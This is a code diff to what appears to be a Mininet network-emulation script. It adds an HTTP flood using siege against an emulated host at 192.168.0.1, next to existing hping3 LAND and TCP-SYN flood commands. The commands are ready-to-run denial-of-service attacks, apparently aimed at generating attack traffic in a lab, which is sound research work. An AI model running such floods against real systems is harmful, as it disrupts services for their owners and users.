@@ -94,6 +94,15 @@ def execute_attack(src, dst, attack_cmd, description, duration=20):
     sleep(100)
     print(f"End {description}")
 
+# Execute HTTP Flood attack using siege
+def execute_http_flood_attack(src, dst, duration=60):
+    print("--------------------------------------------------------------------------------")
+    print("Executing HTTP Flood attack using siege")
+    print("--------------------------------------------------------------------------------")
+    src.cmd(f"timeout {duration}s siege -c 100 -t 1M {dst}")
+    sleep(duration)
+    print("End HTTP Flood attack")
+
 # Start the network and execute attacks
 def startNetwork():
     # Create the custom topology
@@ -126,6 +135,9 @@ def startNetwork():
     execute_attack(choice(hosts), dst, f"hping3 -1 -V -d 120 -w 64 --flood -a {dst}", "Executing a LAND Attack")
     # Execute a TCP-SYN Flood attack to host h1 192.168.0.1
     execute_attack(choice(hosts), "192.168.0.1", "hping3 -S -V -d 22617 -w 64 -p 80 --rand-source --flood", "Executing a TCP-SYN Flood attack to host h1 192.168.0.1")
+
+    # Execute HTTP Flood attack using siege `siege -c 100 -t 1M http://192.168.0.1`
+    execute_http_flood_attack(net.get('attacker'), "http://192.168.0.1")
 
     net.stop()
 
